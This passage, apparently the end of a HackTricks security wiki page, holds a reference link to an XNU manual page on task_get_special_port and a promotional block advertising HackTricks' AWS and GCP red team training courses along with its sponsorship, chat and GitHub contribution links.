* [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task\_get\_special\_port.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
